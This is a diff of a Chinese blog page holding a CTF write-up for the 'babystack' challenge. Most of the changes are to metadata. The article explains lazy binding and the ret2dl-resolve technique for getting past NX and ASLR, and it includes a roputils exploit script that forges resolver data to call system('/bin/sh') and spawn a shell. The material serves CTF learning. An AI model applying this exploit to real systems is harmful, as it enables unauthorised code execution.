@@ -30,7 +30,7 @@
 <meta property="og:description" content="babystack WP​    拿到题目扔ida一看发现是一道栈溢出，但开启了nx保护，而程序没有能泄露地址的函数，所以无法利用rop，想了很久。后来查了才知道这题要用return2dl-resolve来做。">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2018-07-27T00:37:40.000Z">
-<meta property="article:modified_time" content="2020-07-06T02:08:50.320Z">
+<meta property="article:modified_time" content="2020-09-11T15:50:23.999Z">
 <meta property="article:author" content="XDW">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="PWN">
@@ -141,7 +141,7 @@
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">30</span></a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">9</span></a>
 
   </li>
         <li class="menu-item menu-item-archives">
@@ -201,7 +201,7 @@
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">30</span>
+        <span class="site-state-item-count">9</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
@@ -286,7 +286,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2020-07-06 10:08:50" itemprop="dateModified" datetime="2020-07-06T10:08:50+08:00">2020-07-06</time>
+        <time title="修改时间：2020-09-11 23:50:23" itemprop="dateModified" datetime="2020-09-11T23:50:23+08:00">2020-09-11</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -294,7 +294,7 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/PWN%E7%BB%83%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">PWN练习</span></a>
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
         </span>
     </span>
 
@@ -318,7 +318,7 @@
         <h1 id="babystack-WP"><a href="#babystack-WP" class="headerlink" title="babystack WP"></a>babystack WP</h1><p>​    拿到题目扔ida一看发现是一道栈溢出，但开启了nx保护，而程序没有能泄露地址的函数，所以无法利用rop，想了很久。后来查了才知道这题要用return2dl-resolve来做。</p>
 <a id="more"></a>
 
-<p>​    return2dl-resolve可以用来绕过aslr和nx，但是由于这种利用相对比较高级，利用起来比较难理解，所以一般情况下是不用这种利用的，比如如果是栈溢出但是题目给了你libc或者有leak函数给你的话，你就可以用rop，没有必要使用ret2dl-resolve，但是如果题目没有给你libc，而且程序中不能leak的话，碰到这种死局一般就要想到要用到ret2dl-resolve。这里说到ret2dl-resolve就不能不介绍一下linux下对可执行程序使用的延迟绑定技术了。<br>    一个动态链接的程序，如果在链接的时候将所有函数都进行解析，那么链接过程花费的时间肯定就长，针对这个缺点，动态链接器只对程序中调用到的libc库函数进行解析定位，那些没有用到的就不用去解析，这样就能提高链接效率，提高程序启动速度了。<br>    一个elf可执行程序，当调用一个函数的时候会根据对应函数got表中的地址调用相应的函数。比如调用plt表中的函数首先会取出对应函数got表中的值，然后做一个跳转，但如果是第一次调用该函数，那么got表中的值是指向plt第二句的，plt的第二句会压入一个偏移，表示该函数在got表中的表项。之后程序会跳到got表起始地址+8处，这里保存着解析函数dl_runtime_resolve，前面会把link_map以及reloc_arg压栈，这样就相当于是执行了_dl_runtime_resolve(link_map,reloc_arg)，这个函数会根据link_map地址和偏移将libc真实地址写入到对应函数got表中。之后调用函数的话就可以直接调用got中保存的地址，不需要plt再去查找并绑定了。</p>
+<p>​    return2dl-resolve可以用来绕过aslr和nx，但是由于这种利用相对比较高级，利用起来比较难理解，所以一般情况下是不用这种利用的，比如如果是栈溢出但是题目给了你libc或者有leak函数给你的话，你就可以用rop，没有必要使用ret2dl-resolve，但是如果题目没有给你libc，而且程序中不能leak的话，碰到这种死局一般就要想到要用到ret2dl-resolve。这里说到ret2dl-resolve就不能不介绍一下linux下对可执行程序使用的延迟绑定技术了。<br>​    一个动态链接的程序，如果在链接的时候将所有函数都进行解析，那么链接过程花费的时间肯定就长，针对这个缺点，动态链接器只对程序中调用到的libc库函数进行解析定位，那些没有用到的就不用去解析，这样就能提高链接效率，提高程序启动速度了。<br>​    一个elf可执行程序，当调用一个函数的时候会根据对应函数got表中的地址调用相应的函数。比如调用plt表中的函数首先会取出对应函数got表中的值，然后做一个跳转，但如果是第一次调用该函数，那么got表中的值是指向plt第二句的，plt的第二句会压入一个偏移，表示该函数在got表中的表项。之后程序会跳到got表起始地址+8处，这里保存着解析函数dl_runtime_resolve，前面会把link_map以及reloc_arg压栈，这样就相当于是执行了_dl_runtime_resolve(link_map,reloc_arg)，这个函数会根据link_map地址和偏移将libc真实地址写入到对应函数got表中。之后调用函数的话就可以直接调用got中保存的地址，不需要plt再去查找并绑定了。</p>
 <p>利用方式：<br>控制EIP为PLT[0]的地址，只需传递一个index_arg参数<br>控制index_arg的大小，使reloc的位置落在可控地址内<br>伪造reloc的内容，使sym落在可控地址内<br>伪造sym的内容，使name落在可控地址内<br>伪造name为任意库函数，如system 因为它查找是通过辨识函数字符串的</p>
 <p>利用可以说是很复杂了，但是格式基本差不多，github上找到利用脚本，需要roputils扩展。<br>利用脚本：</p>
 <figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">from</span> roputils <span class="meta">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="symbol">fpath</span> = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="symbol">offset</span> = int(sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="symbol">rop</span> = ROP(fpath)</span><br><span class="line"></span><br><span class="line"><span class="keyword">addr_bss </span>= rop<span class="meta">.section</span>(<span class="string">'.bss'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">buf </span>= rop.retfill(offset)</span><br><span class="line"></span><br><span class="line"><span class="keyword">buf </span>+= rop.call(<span class="string">'read'</span>, <span class="number">0</span>, <span class="keyword">addr_bss, </span><span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">buf </span>+= rop.dl_resolve_call(<span class="keyword">addr_bss+20, </span><span class="keyword">addr_bss)</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">p </span>= <span class="meta">Proc</span>(rop.fpath)</span><br><span class="line"></span><br><span class="line"><span class="symbol">p.write</span>(p32(len(<span class="keyword">buf)) </span>+ <span class="keyword">buf)</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">print </span><span class="string">"[+] read: %r"</span> % p.read(len(<span class="keyword">buf))</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">buf </span>= rop.<span class="keyword">string('/bin/sh')</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">buf </span>+= rop.fill(<span class="number">20</span>, <span class="keyword">buf)</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">buf </span>+= rop.dl_resolve_data(<span class="keyword">addr_bss+20, </span><span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">buf </span>+= rop.fill(<span class="number">100</span>, <span class="keyword">buf)</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">p.write(buf)</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">p.interact(0)</span></span><br></pre></td></tr></table></figure>
